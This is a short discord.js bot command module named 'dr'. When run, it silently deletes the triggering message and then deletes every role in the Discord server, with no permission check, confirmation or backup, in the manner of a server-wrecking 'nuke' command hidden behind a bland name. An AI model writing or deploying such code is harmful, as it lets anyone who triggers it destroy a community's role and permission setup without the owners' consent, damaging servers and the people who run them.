const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "dr",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
        message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(("Error Found: " + err)) }))
        
    }
}